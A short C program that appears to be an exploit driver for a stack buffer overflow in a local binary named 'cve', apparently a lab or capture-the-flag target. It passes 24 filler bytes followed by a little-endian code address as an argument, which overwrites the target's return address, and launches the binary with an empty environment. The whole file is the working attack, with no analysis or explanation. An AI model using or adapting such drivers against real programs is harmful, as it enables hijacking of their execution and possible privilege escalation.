#include <unistd.h>

int main()
{
    char addr[28]  = { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0x10, 0x06, 0x40, 0 };
    char *newenviron[] = { NULL };

    char *argv[] = { "cve", addr, NULL };

    execve("./cve", argv, newenviron);

}
